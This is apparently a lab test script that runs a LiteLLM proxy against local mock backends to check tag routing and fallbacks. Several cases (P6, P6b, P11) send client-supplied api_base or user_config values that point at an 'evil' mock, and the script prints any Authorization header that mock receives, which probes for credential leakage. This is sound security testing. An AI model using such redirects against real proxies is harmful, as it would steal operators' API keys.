"""Phase 0 / tags: tag routing + fallbacks through the LiteLLM PROXY (v1.92.0, Utility image), mocks only.

Run from lab dir:  ./run.sh tags/proxy_tag_fallbacks.py [match_any|match_all]
Starts mocks in-process, writes tags/proxy/config_<variant>.yaml, launches `litellm --config ...` as subprocess,
then sends requests with httpx and prints per-mock request counts.
Keys are resolved by tags/proxy/custom_auth_tags.py (tags bound to key metadata / team metadata).
"""
import json, os, subprocess, sys, time
import httpx
from tags.mock_ext import start_mocks

VARIANT = sys.argv[1] if len(sys.argv) > 1 else "match_any"
PORTS = {"a-ch": 9301, "a-us": 9302, "b-us": 9303, "b-untagged": 9304, "c-ch": 9305, "c-regex": 9306, "evil": 9309}
M = start_mocks(PORTS)
HERE = os.path.dirname(os.path.abspath(__file__))
PDIR = os.path.join(HERE, "proxy")


def dep(group, name, tags=None, **extra):
    lp = {"model": f"openai/{name}-model", "api_base": f"http://127.0.0.1:{PORTS[name]}/v1", "api_key": f"sk-mock-{name}"}
    if tags is not None:
        lp["tags"] = tags
    lp.update(extra)
    return {"model_name": group, "litellm_params": lp, "model_info": {"id": name}}


cfg = {
    "model_list": [
        dep("A", "a-ch", ["ch"]), dep("A", "a-us", ["us"]),
        dep("B", "b-us", ["us"]), dep("B", "b-untagged"),
        dep("C", "c-ch", ["ch"]), dep("C", "c-regex", None, tag_regex=["^User-Agent: evil"]),
    ],
    "router_settings": {
        "enable_tag_filtering": True,
        "tag_filtering_match_any": VARIANT == "match_any",
        "fallbacks": [{"A": ["B"]}],
        "num_retries": 0,
        "routing_strategy": "latency-based-routing",  # same as Utility values.yaml router.routingStrategy
    },
    "general_settings": {"master_key": "sk-master", "custom_auth": "custom_auth_tags.user_api_key_auth"},
    "litellm_settings": {"drop_params": True, "num_retries": 0},
}
# litellm accepts JSON as YAML
cfg_path = os.path.join(PDIR, f"config_{VARIANT}.yaml")
with open(cfg_path, "w") as f:
    json.dump(cfg, f, indent=1)

log = open(os.path.join(PDIR, f"proxy_{VARIANT}.log"), "w")
proc = subprocess.Popen(["litellm", "--config", cfg_path, "--port", "4000"], stdout=log, stderr=subprocess.STDOUT, cwd=PDIR)
base = "http://127.0.0.1:4000"
for _ in range(120):
    try:
        if httpx.get(base + "/health/liveliness", timeout=1).status_code == 200:
            break
    except Exception:
        pass
    time.sleep(1)
else:
    print("proxy did not start"); proc.kill(); sys.exit(1)
print(f"proxy up, variant={VARIANT}")


def reset(modes=None):
    for m in M.values():
        m.reset()
    for k, v in (modes or {}).items():
        M[k].mode = v


def call(name, key="sk-commune", body_extra=None, headers=None, modes=None, n=1, model="A"):
    reset(modes)
    results = {}
    last = None
    for _ in range(n):
        body = {"model": model, "messages": [{"role": "user", "content": "hi"}]}
        body.update(json.loads(json.dumps(body_extra or {})))
        h = {"Authorization": f"Bearer {key}"}
        h.update(headers or {})
        r = httpx.post(base + "/v1/chat/completions", json=body, headers=h, timeout=60)
        mid = r.headers.get("x-litellm-model-id")
        k = f"{r.status_code}:{mid}"
        results[k] = results.get(k, 0) + 1
        last = r
    counts = {k: m.count for k, m in M.items() if m.count}
    print(f"\n### {name}\n  counts={counts}\n  responses={results}")
    if last.status_code != 200:
        print(f"  last_error={last.text[:300]}")
    else:
        print(f"  attempted_fallbacks={last.headers.get('x-litellm-attempted-fallbacks')} attempted_retries={last.headers.get('x-litellm-attempted-retries')}")
    sys.stdout.flush()
    return last


try:
    call("P1 sk-commune (key tags=[ch]) model A, n=10", n=10)
    call("P2 sk-commune + body tags=['us'] n=10", body_extra={"tags": ["us"]}, n=10)
    call("P2b sk-commune + header x-litellm-tags: us n=10", headers={"x-litellm-tags": "us"}, n=10)
    call("P2c sk-commune + body metadata.tags=['us'] n=10", body_extra={"metadata": {"tags": ["us"]}}, n=10)
    call("P2d sk-team (team tags=[ch]) + body tags=['us'] n=10", key="sk-team", body_extra={"tags": ["us"]}, n=10)
    call("P2e sk-team (team tags=[ch]) no client tags n=10", key="sk-team", n=10)
    call("P2f sk-commune + body litellm_metadata.tags=['us'] n=10", body_extra={"litellm_metadata": {"tags": ["us"]}}, n=10)
    call("P3 sk-commune + body tags=['!ch']", body_extra={"tags": ["!ch"]})
    call("P4 sk-commune, a-ch down, router fallback A->B (B=[b-us(us), b-untagged])", modes={"a-ch": "down"})
    call("P5 sk-commune, a-ch down, client fallbacks=[{'model':'B','metadata':{'tags':['us']}}]",
         modes={"a-ch": "down"}, body_extra={"fallbacks": [{"model": "B", "metadata": {"tags": ["us"]}}]})
    call("P5b sk-commune, a-ch down, client fallbacks=['B']", modes={"a-ch": "down"}, body_extra={"fallbacks": ["B"]})
    call("P5c sk-commune, a-ch down, client fallbacks=[{'model':'b-us'}] (deployment id)",
         modes={"a-ch": "down"}, body_extra={"fallbacks": [{"model": "b-us"}]})
    call("P5d sk-commune, a-ch down, client fallbacks=[{'model':'B','tags':['us']}]",
         modes={"a-ch": "down"}, body_extra={"fallbacks": [{"model": "B", "tags": ["us"]}]})
    r = call("P6 sk-commune, a-ch down, client fallbacks=[{'model':'B','api_base':evil}]",
             modes={"a-ch": "down"}, body_extra={"fallbacks": [{"model": "B", "api_base": f"http://127.0.0.1:{PORTS['evil']}/v1"}]})
    if M["evil"].requests:
        print("  evil received Authorization header:", M["evil"].requests[0]["headers"].get("authorization"))
    call("P6b control: root-level api_base in body", body_extra={"api_base": f"http://127.0.0.1:{PORTS['evil']}/v1"})
    call("P7 sk-commune model='a-us' (deployment id) n=3", model="a-us", n=3)
    call("P7b sk-commune model='openai/a-us-model' (litellm_params.model) n=3", model="openai/a-us-model", n=3)
    call("P8 sk-open (no tags) no client tags model A n=10", key="sk-open", n=10)
    call("P9 sk-commune model C, User-Agent: evil/1.0 n=10", model="C", headers={"User-Agent": "evil/1.0"}, n=10)
    call("P9b sk-commune model C, default UA n=10", model="C", n=10)
    call("P10 sk-commune, a-ch down, mock_testing_fallbacks? (no) ; client disable_fallbacks=true",
         modes={"a-ch": "down"}, body_extra={"disable_fallbacks": True})
    call("P11 sk-commune + body user_config (client-supplied router)",
         body_extra={"user_config": {"model_list": [{"model_name": "A", "litellm_params": {"model": "openai/x", "api_base": f"http://127.0.0.1:{PORTS['evil']}/v1", "api_key": "k"}}]}})
finally:
    proc.terminate()
    try:
        proc.wait(10)
    except Exception:
        proc.kill()
